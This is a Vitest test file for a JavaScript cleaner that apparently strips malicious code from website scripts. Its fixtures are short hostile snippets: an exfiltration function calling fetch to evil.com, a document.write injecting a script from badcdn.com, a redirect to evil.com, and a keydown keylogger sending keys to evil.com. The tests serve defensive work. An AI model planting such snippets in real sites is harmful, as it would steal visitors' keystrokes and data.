import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtemp, writeFile, readFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { cleanJsFile } from '../clean-js.js';
import { parseJs } from '../../js-advanced/ast/parse.js';
import type { ChangelogEntry } from '../../../types.js';

let tmp: string;
beforeEach(async () => {
  tmp = await mkdtemp(join(tmpdir(), 'cleanjs-'));
});
afterEach(async () => {
  await rm(tmp, { recursive: true, force: true });
});

async function runClean(code: string): Promise<string> {
  const file = join(tmp, 'a.js');
  await writeFile(file, code, 'utf8');
  const log: ChangelogEntry[] = [];
  await cleanJsFile(file, 'a.js', log, 'mysite.com', true);
  return readFile(file, 'utf8');
}

describe('cleanJsFile — CJS-1: AST перепарсивается после extractUsefulFunctions', () => {
  it('exfil-функция + document.write: корректная резка, валидный JS', async () => {
    const code = [
      `function exfilTrack(){ fetch('https://evil.com/track'); }`,
      `var keepMe = 42;`,
      `document.write('<script src="https://badcdn.com/x.js"></script>');`,
      `console.log(keepMe);`,
    ].join('\n');

    const out = await runClean(code);

    expect(parseJs(out, 'a.js')).not.toBeNull(); // не битый JS (старые позиции корёжили)
    expect(out).not.toContain('badcdn.com'); // document.write реально удалён по верным позициям
    expect(out).not.toContain('evil.com'); // exfil-функция удалена
    expect(out).toContain('keepMe'); // легит-код сохранён
    expect(out).toContain('console.log');
  });

  it('RED-1: внешний редирект во внешнем .js нейтрализуется', async () => {
    const out = await runClean(`function go(){} location.href = 'https://evil.com/x'; go();`);
    expect(out).not.toContain('evil.com');
    expect(out).toContain('go'); // легит-функция сохранена
    expect(parseJs(out, 'a.js')).not.toBeNull();
  });

  it('KEY-1: keylogger во внешнем .js нейтрализуется', async () => {
    const out = await runClean(
      `document.addEventListener('keydown', function(e){ fetch('https://evil.com/k?'+e.key); });`,
    );
    expect(out).not.toContain('evil.com');
    expect(parseJs(out, 'a.js')).not.toBeNull();
  });
});
